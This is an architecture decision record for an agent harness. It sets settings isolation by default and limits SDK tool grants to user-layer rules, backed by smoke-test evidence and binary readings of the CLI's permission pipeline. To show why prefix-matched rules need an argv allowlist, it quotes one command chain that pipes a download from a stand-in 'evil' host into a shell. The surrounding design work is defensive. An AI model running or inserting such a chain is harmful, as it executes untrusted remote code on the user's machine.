# ADR-0040: the primary session isolates Claude Code settings by default; a harness user-layer rule allow is the SDK grant

- **Status:** Proposed; merge gated on the four keyed smoke legs (`isolated-floor`, `isolated-grant`, `isolated-project-rule`, `inherited`); keyed run 1 (22/10/2026) passed `isolated-grant` and `inherited` and failed the other two on a probe the CLI's floor auto-allows; run 2 (27/10/2026, `6fac88a`) left the two floor legs UNCHECKED on an oracle that did not know the floor's refusal text; run 3 ran on 27/10/2026 at `ac739cf`: PASS on all four legs (evidence tasks/issue-140-evidence/<leg>.json, copied to tasks/issue-140-evidence/keyed-run3-ac739cf/).
- **Date:** 2026-10-22
- **Requirements:** issue #140 (the harness omits `settingSources`); issue #155 evidence; R-11 (ambient Claude Code configuration); ADR-0014 §3, §4, §5, §7 (the permission model); ADR-0036 D3 and its unverified-negative bullet (the judge's isolation keys); #105 (`tools`, deferred); #190 (the table-driven policy corpus; its session-options meta-test stays scoped to the primary session); the design spec `tasks/issue-140-design-spec.md` and its owner and controller rulings of 20/10/2026 and 21/10/2026 (D-1 to D-8).
- **Amends:** ADR-0008 (§1: a pre-tool handler's return value is now read as a grant), ADR-0036 (the `:141` unverified negative is settled with caveats; its `settingSources` revisit-if has fired), ADR-0037 (decision 9 observations (b) and (c) are dated), ADR-0035 (the first of its "two issues to file"), ADR-0010 (the session's primary query now passes six keys), ADR-0014 §3, §4, §5 (a user-layer rule allow is now also the SDK grant). **Relates to:** ADR-0015 (the sandbox is the argv gate D-8 relies on), ADR-0031 (the grant reason carries no glob), ADR-0039 (D5 precedent for a non-additive union widening), security-model R-8, R-11, R-15, R-22.

The permission consequence is the reason this is not a one-line change. With the SDK's default `permissionMode` (`"default"`; the live child init reads `permissionMode: "default"`) and no canUseTool, the bundled CLI's order for a tool call is, read from the 2.1.201 binary and the SDK 0.3.201 typings (offsets are into `node_modules/@anthropic-ai/claude-agent-sdk-darwin-arm64/claude`):

1. The exemption set is empty: `PFe(e) = !e.mcpInfo && e4m.has(e.name)` (offset 219052591) with `e4m = new Set([])` (offset 219073991), so no tool skips the pipeline.
2. A hook `deny` denies ("Hook denied tool use for", offset 218363199) and wins over allow rules and `allowedTools`.
3. A hook that returns no decision (the harness's `{}`) falls through to the full pipeline: the tool's own `checkPermissions`, the settings rules, the mode.
4. A hook `allow` is passed back through the full pipeline when the context requires `canUseTool` ("Hook approved tool use for ..., but canUseTool is required", offset 218363450). The flag is not settable from SDK `Options`; the primary query reads as unset. **Not triggered in keyed run 3 (`isolated-grant`, 2.1.201): the hook allow was not downgraded.**
5. A deny rule overrides a hook allow, and an ask rule or a built-in safety check sends it to the full pipeline. **Read from the binary.** Keyed run 3's `isolated-floor` exercises the floor with no hook allow, not this step; `isolated-grant` shows an in-cwd `touch` ran on a hook allow, with no rule layer loaded, so the deny-rule override itself is unexercised.
6. Otherwise the hook allow is honoured ("bypassing permission prompt", offset 218364049).

Under `[]` the user, project and local rule layers are gone, so a hook `{}` leaves the CLI's headless floor: Read, Glob and Grep inside the working directory run; Edit, Write, NotebookEdit, WebFetch and WebSearch ask, and so does any Bash command the CLI's own read-only validator does not accept; an ask with no prompter is auto-denied (`sdk.d.ts:3900`: "headless-agent auto-deny"). Keyed run 1 (22/10/2026) showed that the bundled CLI still ran a literal `printf` with no grant and no ask (the model's `printf harness-ok-<nonce>` ran under the floor); by the binary reading its read-only validator (eXp) accepts that command, and `echo` too, while the other Bash commands ask and, headless, are refused (observed only for `curl`, below). The rest of the per-tool floor is read from the binary and unverified by execution, apart from the cases observed here and below; keyed run 3 (27/10/2026, `ac739cf`) observed the floor refuse `touch harness-ok-<nonce>` inside the working directory: the model received as an error tool_result the text that, by the binary reading, is the Bash path validator's (OJp) ask (`touch in '<path>' was blocked. For security, Claude Code may only create or modify files in the allowed working directories for this session: ...`), and no `permission_denied` system message was captured on the stream (D1, keyed legs paragraph). Observed: WebFetch was denied in every B2 run, and Bash `curl` in run 4, where the model reported it was blocked twice while the harness printed `denied=0` (`tasks/issue-145-evidence/runs-2026-10-09/run4.log:5-7` and `:17`). So `{}` on every allow cannot survive isolation: the operator's `~/.harness/settings.json` could say `allow Bash` and the CLI would still deny it.

## Decision

**D1. The primary session isolates by default.** `createSession` passes `settingSources: []` and `strictMcpConfig: true` on the primary query. Both come from one function, `buildSessionIsolation` (`src/session/session.ts:489`), spread into the options at `:1652`, so the keyless canary asserts one object and has one mutation target. `strictMcpConfig` follows the list (`settingSources.length === 0`), so an isolated child also ignores `.mcp.json`, settings-declared servers and plugin servers (D-3). The list is copied, never handed to the SDK by reference, and a non-array fails with a `TypeError` (`:490-493`). The session passes six keys now (`model`, `systemPrompt`, `maxTurns`, `settingSources`, `strictMcpConfig`, `hooks`), none of `tools`, `skills` or `persistSession` (`src/session/session.ts:1649-1658`). Library callers are isolated by default: `SessionConfig.settingSources` is optional and absent means `[]` (`src/session/types.ts:412-413`).

*Keyed legs (27/10/2026, run 3 at `ac739cf`; the owner ran it and reported exit 0 from the terminal, which the JSON does not record).* Each leg's `detail`, pasted from its JSON:

- `isolated-floor`: nothing loaded (no marker, plugin, MCP server, project skill, command or agent, non-default mode or CLAUDE.md text), no granted-by-rule row, and the CLI floor denied Bash (isError tool_result, path-validator ask on the in-cwd nonce path)
- `isolated-grant`: Bash ran through the harness grant (the nonce file exists and the Bash tool_use carried the probe): exactly one granted-by-rule row ("permission: allow Bash [rule 0, user]"), no permission_denied, nothing loaded (including project skills, commands and agents) under settingSources: []
- `isolated-project-rule`: nothing loaded (no marker, plugin, MCP server, project skill, command or agent, non-default mode or CLAUDE.md text), no granted-by-rule row, and the CLI floor denied Bash (isError tool_result, path-validator ask on the in-cwd nonce path)
- `inherited`: user, project and local markers created, a numbat-* project skill, command and agent listed on the init message, CLAUDE.md sentence quoted, ambient Bash allow ran Bash, no granted-by-rule row; plugin marker NOT created (recorded, not judged: a project-local plugin's hook loading is UNVERIFIED on 2.1.201); the start line is the CLI's and is not observable through createSession (keyless pin, Task 6)

Runs 1 and 2 are kept for the record: run 1 (`ee932f6`) failed the two floor legs because its `printf` probe ran ungranted (by the binary reading, the read-only validator accepts it); run 2 (`6fac88a`) observed the same refusal as run 3 but its oracle knew only the not-granted text and a `permission_denied` system message, not the path-validator ask, so both floor legs were UNCHECKED (evidence `keyed-run1-ee932f6/`, `keyed-run2-6fac88a/`).

**D2. The opt-in is `sdk.settingSources` in the USER settings file only.** `{ "sdk": { "settingSources": ["user", "project", "local"] } }`. The value is an array of distinct members of the SDK's `SettingSource` union (`SETTING_SOURCES`, `src/security/sdk-settings.ts:9`); order is ignored; an absent key, an absent list and `[]` all mean isolated. Anything else is an `SdkSettingsError` (`:13`) re-tagged `SettingsLoadError`, exit 2, with a fixed message that names the key path and the three literals and never echoes the value (`SDK_SETTING_SOURCES_MESSAGE`, `:21`; `parseSdkSettings`, `:40-53`). An unknown key inside `sdk` is an error (ADR-0034 decision 1). The project document's `sdk` key is never parsed (`src/cli/shared.ts:373`: `isUser ? parseSdkSettings(doc) : []`); its presence adds one warning, `ignoring "sdk" in <project path>: Claude Code settings sources are configured only in ~/.harness/settings.json` (`:401-403`), so a cloned repository cannot widen what its own `.claude` files do. When a list is inherited, `composeSecurity` adds up to two warnings (`:404-405`): `SDK_USER_INHERIT_WARNING` for `user` (`:324`) and `SDK_PROJECT_INHERIT_WARNING` for `project` or `local` (`:326`). Every command that composes security prints them with the `warning: ` prefix: `run` (`src/cli.ts:538`), `eval` (`src/cli/eval-command.ts:230`) and `permissions` (`src/cli/permissions-command.ts:116`). The start line is printed by `run` only, to stderr, and only when something is inherited (`src/cli.ts:545-546`; `sdkStartLine`, `src/cli/run-sdk.ts:7`): `[harness] claude code settings: inherited (user, project, local); their permission rules, hooks, plugins, MCP servers and CLAUDE.md files apply to this run`, with the members in `SETTING_SOURCES` order. The default prints nothing. `run` and `eval` pass the list into `SessionConfig` (`src/cli.ts:585`, `src/cli/eval-command.ts:197`).

**D3. A harness USER-layer rule allow is the SDK grant (A').** Under D1 the CLI's own rule layers no longer exist, so the harness's pre-tool hook returns `permissionDecision: 'allow'` exactly when a harness rule granted, and `{}` otherwise.

- *What grants.* `permissionHook(evaluator, prompter, grantPolicy)` resolves an `allow` through `grantFor` (`src/security/permissions/evaluate.ts:261-269`), which returns a grant only when `evaluation.decision === 'allow'` and `evaluation.layer === 'user'`. A project-layer allow, a `defaultDecision` allow (layer `null`) and an approved `ask` return nothing, so the CLI's floor decides. The project file can tighten and never grant (D-7), which is ADR-0014 §5's intent stated for the new channel; R-8 is unaffected because a default allow never grants. Deny and ask branches are unchanged (`:282-307`): a deny still throws `PermissionDenied`, an `ask` with no prompter still denies.
- *The grant value.* `PreToolGrant` is `{ readonly grant: 'rule'; readonly reason: string }` (`src/internal/pre-tool-grant.ts:8-13`), a zero-dependency leaf that both import-free peers (security builds it, hooks detects it) share so the literal cannot drift; `isPreToolGrant` accepts only an own `grant === 'rule'` and a string `reason` (`:18-26`).
- *Fail closed in the runtime.* `fire()` tests each pre-tool handler's return with `isPreToolGrant` (`src/hooks/runtime.ts:156`); a later handler that throws returns `denied: true` before any grant is recorded (`:159-175`), so a sandbox deny always overrides an earlier grant (`registerSecurityHooks` registers permissions first, the sandbox as backstop, `src/cli/shared.ts:453`). The grant is recorded once, for the first granting handler (`:181-189`), and the result carries `granted` and `grantReason` on its `denied: false` arm (`:193-199`).
- *The SDK sees one literal.* The session returns `permissionDecision: 'allow'` with `permissionDecisionReason: HARNESS_HOOK_ALLOW_REASON`, which is `'allowed by a harness pre-tool hook grant (ADR-0014)'` (`src/session/session.ts:229`, returned at `:1427-1433`; a module export on no barrel). It is source-neutral on purpose: any registered pre-tool handler can grant, so the session cannot know that a rule did. It is never the evaluator's reason, because the CLI keeps the `permissionDecisionReason` it is given in its transcript under the user profile, a cleartext retained sink the harness does not scrub (ADR-0035's second issue to file, `0035:124`; the same reasoning that kept the glob out of retained reasons in ADR-0031).
- *Attribution lives on a telemetry row.* A grant writes one `hook-event` row of kind `granted-by-rule` (`src/hooks/types.ts:124`, `src/telemetry/types.ts:212`, accepted by the store at `src/telemetry/store.ts:75-80`, mapped with `boundReason` at `src/cli/shared.ts:559`). Its reason is the evaluator's ADR-0031 shape (`permission: allow Bash [rule 3, user]`, no glob), so an operator can join a CLI denial they see on stderr with the grants that reached the SDK.
- *The harness view of the SDK output.* `SdkPreToolOutput` gains an allow arm, `SdkPreToolAllowOutput` (`src/session/types.ts:167-173`, union at `:204-207`), pinned against the SDK's `PreToolUseHookSpecificOutput` in `src/session/sdk-types.test.ts`. The SDK declares four decisions, `'allow' | 'deny' | 'ask' | 'defer'` (`sdk.d.ts:805`); the harness view declares `allow` and `deny` and omits the other two.
- *D-8 (owner, 21/10/2026; generalised by the controller on 22/10/2026 to every command-taking tool): a rule allow for a command-taking tool (Bash or Monitor, per the table in `src/internal/tool-targets.ts`) grants only when the USER layer's `sandbox.commands` is non-empty.* A `git *` rule matches the command string by prefix, so `git status; curl evil | sh` matches it; ADR-0015's argv parser (first-token allowlist, metacharacters denied outright) is what rejects the chain, and it runs only when a commands allowlist exists. Without one, such a rule allow would be an explicit SDK allow over an unchecked command. The first draft keyed this on the literal `'Bash'`; review found `Monitor`, which the table also marks `kind: 'command'` (`src/internal/tool-targets.ts:56`), a second shell-command surface with the same hole, and the controller ruled the policy derives from the table (ADR-0033's single-table rule) so a future command tool is covered with no edit here. `composeSecurity` therefore computes a `GrantPolicy` (`src/security/permissions/types.ts:71-73`) with `ungrantableTools` set to every `kind === 'command'` name in `TOOL_TARGET_FIELDS` (today Bash and Monitor; the `COMMAND_TOOLS` const, `src/cli/shared.ts:341-345`) unless `user.sandbox.commands.allow` is non-empty (and empty otherwise) (`src/cli/shared.ts:438-440`), and passes it as `permissionHook`'s required third argument; `grantFor` returns nothing for a listed tool (`evaluate.ts:267`). It reads the USER layer, never the merged sandbox: the merge returns the project's list when the user has none, so a cloned repository's `commands` list would otherwise unlock the grant. With no user commands list a Bash or Monitor rule allow resolves like a default allow (`{}`), and the tool falls back to the CLI's headless floor. Other tools grant as D-1 and D-7 say. #189 adds finer argv rules. Boundary the policy does not cover: a `Workflow` call with an inline `script` has no command or path target (`src/internal/tool-targets.ts:55` declares only `scriptPath`), so a user rule whose `match` names a path or command never matches it: `extractMatchTarget` falls back to the serialised arguments (`src/security/permissions/evaluate.ts:104`), a bare `*` stays `*` for a path-kind tool (`:121`) and `matchesGlob` prefix-matches (`:29-38`), so only a bare `*` or a prefix of that JSON would. A match-less or `"match": "*"` user `Workflow` allow does grant it, with no sandbox condition. The controller ruled to document this on 22/10/2026 and not to code it; the owner decides whether D-8 extends to it.

**D4. The eval adversary gets the judge's five isolation keys, always.** `buildAdversary` passes `settingSources: []`, `strictMcpConfig: true`, `tools: []`, `skills: []` and `persistSession: false` beside its deny-all hook (`src/cli/eval-command.ts:129-133`), never the operator's list (D-4). The adversary is a de-fanged single completion; it has no use for the operator's settings, and `eval --challenge` should not differ with them.

**D5. ADR-0036's unverified negative is settled, with caveats.** ADR-0036 left open whether installed plugins load under `settingSources: []`. Settled by comparison: the `withheld` child (default sources) lists five plugins and two plugin MCP servers (`withheld.json`, `childInit`: `superpowers`, `code-simplifier`, `context7`, `vercel`, `warp`), and the judge child under `[]` lists `plugins: []` and `mcp_servers: []` (`hostile-cwd.json`, `childInit`). The mechanism, read from the binary and not executed, is that `enabledPlugins` is a settings key (prose at binary offset 208989007) dropped with the other keys by `zMt`. Caveats: the judge child's `tools: []`, `skills: []` and `strictMcpConfig` over-determine `mcp_servers`; `plugins` is a CLI self-report; the reading is pinned to CLI 2.1.201; `--plugin-dir` and the SDK `plugins` option sit outside settings; managed settings can still enable plugins. The `isolated-floor` leg's plugin-hook marker is the stronger oracle.

**D6. What stays ambient.** Managed, policy and flag settings (`zMt` keeps them), the OAuth login (the harness requires `ANTHROPIC_API_KEY` in its own environment, `src/cli.ts:491`, and the child inherits it, but the ambient login is not a settings file and still applies), `~/.claude/policy-limits.json`, the transcript under `~/.claude/projects`, and the CLI's bundled skills, slash commands and agents. These are named so R-11's narrowing is not read as closure.

## Consequences

**Positive.** There is one grant surface, auditable per call: every grant that reached the SDK is one `granted-by-rule` row. Runs are reproducible: the operator's hooks, plugins, `CLAUDE.md` and model settings no longer change a run. A cloned repository can neither load its `.claude` files nor grant through `.harness`. The CLI's headless floor protects the operator with no settings file at all: Read, Glob and Grep inside the working directory work, and Edit, Write, NotebookEdit, WebFetch, WebSearch and any Bash command the read-only validator does not accept are denied until a user rule allows them (this floor is a binary reading, observed only for WebFetch and Bash `curl` denied, Bash `printf` allowed by keyed run 1, and Bash `touch` in the working directory refused by keyed run 3 (`isolated-floor`)). The competing operator hook of ADR-0035 note 9 and R-22 is closed by default.

**Negative, accepted.**
- Edit, Write, NotebookEdit, WebFetch and WebSearch, and any Bash command the CLI's read-only validator does not accept, need a user-file rule (documented in the README's Settings section). Bash and Monitor additionally need a user-layer `sandbox.commands` list (D-8). An existing operator's ambient grants vanish; the model's own refusal and the run summary's `cli-denied=N` are the signals (issue #209), with one stderr warning naming the refused tools. `cli-denied` counts the result message's `permission_denials` (`sdk.d.ts:4013`, `:4043`); `denied=` still counts only the harness's own pre-tool denials, so a CLI-blocked run prints `denied=0 cli-denied=N`. The source is the result array, not the `permission_denied` system message (`sdk.d.ts:3900`), which covers only the `canUseTool` deny short-circuit. The owner's keyed capture of 27/10/2026 (merge blocker for #209 by the owner's ruling of that date; commit 46899fd) OBSERVED two things: on `isolated-floor` the array named the Bash call the CLI floor refused through a headless `ask` (the case keyed runs 2 and 3 hit), and on `cli-denied-overlap` it named a Bash call the harness's own hook denied, under the same `tool_use_id`. The array is therefore the union of the CLI's refusals and the harness's hook denials, and the session subtracts the ids it denied itself before counting `cliDenied`, on an exact raw-id match so ids that only clean alike cannot hide a CLI refusal (an entry with no id, or a near-miss id, is kept, so it can over-count). A CLI that omits the array also prints `cli-denied=0`, indistinguishable from none refused.
- The CLI's resolution order is read from one binary (2.1.201). `requireCanUseTool` (step 4) did not downgrade the hook allow in keyed run 3 (`isolated-grant`: the probe ran, one `granted-by-rule` row, no `permission_denied`), observed on 2.1.201 only; an SDK bump that reorders `JXt` (offset 218363042) is detected by the legs, not by a unit test.
- Loss of `effortLevel`, `CLAUDE.md` and the operator's model settings may move eval cost and turns. Task 12 of the plan records the delta; nothing here claims "no change".
- Input secret redaction stays observe-only on a granted call (`src/session/session.ts:1364-1370`), so a granted Bash call carrying a secret in its input runs without the CLI floor in front of it. This is inherent to granting by rule.
- Any registered pre-tool handler can grant, not only `permissionHook`: a consumer-registered handler that returns a `PreToolGrant` (and no later handler throws) is an SDK allow with the same fixed reason. Likewise a library caller that passes `permissionHook` an empty `GrantPolicy` (`ungrantableTools` empty) with no sandbox hook registered bypasses the harness's own floor: the D-8 withholding lives in `composeSecurity` and `registerSecurityHooks`, not in `permissionHook`.
- Two more README strings are pinned by `src/readme-settings.test.ts` (the quickstart sentence and the `ask` sentence).

**Non-additive effects on the public surface** (the ADR-0039 D5 and ADR-0037 R3 precedent; the spec's risk 6 called the first of these additive, which was wrong):
- `permissionHook`, a root-barrel export (`src/index.ts:51`), gains a REQUIRED third parameter, `grantPolicy: GrantPolicy` (`evaluate.ts:282-286`). A caller that passes two arguments fails to compile. The required parameter is the point: a caller cannot forget the D-8 policy. Its return type widens to `Promise<void | PreToolGrant>`.
- `HookEventRecord['kind']` and `HookEventKind` gain `'granted-by-rule'` (`src/hooks/types.ts:124`, `src/telemetry/types.ts:212`), so an exhaustive switch over either needs a case. `SdkPreToolOutput` gains an allow arm, so a reader of `permissionDecision` must handle `'allow'`.
- Additive for callers, named so they are not missed: `HookHandler` may return a `PreToolGrant` (`src/hooks/types.ts`; the type is public through the hooks barrel, `src/hooks/index.ts:2`, while the module `src/internal/pre-tool-grant.ts` is not a subpath export); `FireResult`'s `denied: false` arm gains OPTIONAL `granted` and `grantReason` (`:96-98`), and a consumer-implemented `HookRuntime` that omits them never grants (consumers read `granted === true`, so absence fails closed); `GrantPolicy`, `SettingSource`, `parseSdkSettings`, `SdkSettingsError`, `SETTING_SOURCES` and `SessionConfig.settingSources` are new exports.
- `registerSecurityHooks(hooks, security)` (`src/cli/shared.ts:453`) is now the single registration point for the two security hooks; `run` and `eval` call it. The eval path is guarded behaviourally by the `makeEvalSessionFactory` deny test (`src/cli/eval-command.test.ts:257`); the text pin in `test/policy-corpus.test.ts` that both sites call it is a residual, not a behavioural proof.
  *Amended 29/10/2026 (issue #188, ADR-0042): the function now takes the protected roots as a third argument and registers three hooks, the built-in self-protection deny first. The library-caller property above holds for that guard too: it belongs to the CLI's composition, and a library caller registers it from the root barrel.*

## Alternatives considered

- **A. Grant on every allow (including `defaultDecision` and project-layer allows).** Rejected. A default allow is the shipped default for every tool, so this would grant Bash, Edit and Write to every unconfigured operator: the opposite of the CLI-floor protection. Project-layer grants re-open, through `.harness`, the channel the `.claude/settings.local.json` evidence showed.
- **B. `allowedTools`.** Rejected. It is a static list of tool names (`sdk.d.ts:1331`), while a harness rule can match on the arguments (`Bash` matching `git *`), so it cannot say what the rules say, and it would add a second grant surface with no per-call audit row.
- **C. `permissionMode: 'bypassPermissions'`.** Rejected. The SDK describes it as bypassing all permission checks (`sdk.d.ts:1691`), so the CLI floor would go for every tool, including those no rule names.
- **D. `canUseTool`.** Deferred, not rejected. It is the interactive-prompter path (ADR-0014 §4's revisit-if). Revisit with an interactive mode.
- **Inherit by default (the status quo).** Rejected. It leaves the operator's hooks, plugins and `CLAUDE.md` in every run and makes the grant depend on files the harness does not read.
- **`['user']` as the default.** Rejected. The user layer is where the operator's hooks and plugins live, so it carries most of what R-11 names.
- **Project-layer grants.** Rejected (D-7), above.

## Revisit if

- An SDK bump reorders the CLI's `JXt` pipeline or changes step 4 or step 5: the keyed legs detect it.
- #105 lands `tools` (and `skills`) for the primary session: the bundled-skills residual of D6 changes.
- An interactive prompter exists (option D): an approved `ask` could then be a grant, which this ADR says it is not.
- Enterprise layers (managed settings the operator does not control) matter to a deployment.
- The transcript sink is addressed (ADR-0035's second issue to file).
- A CLI version that stops putting the harness's hook denials (or the floor's `ask` refusals) in `permission_denials`: the 27/10/2026 capture (46899fd) observed both on 2.1.201 only, so an SDK bump re-runs `SMOKE_LEGS=isolated-floor,cli-denied-overlap`. If hook denials leave the array the subtraction is a harmless no-op; if floor refusals leave it, `cli-denied` undercounts and the source needs rethinking. The run4 `denied=0` observation is retired as an operator signal by `cli-denied=N`, not by a change to `denied=`.
- #189 adds finer argv rules: D-8's all-or-nothing `sandbox.commands` condition can narrow.
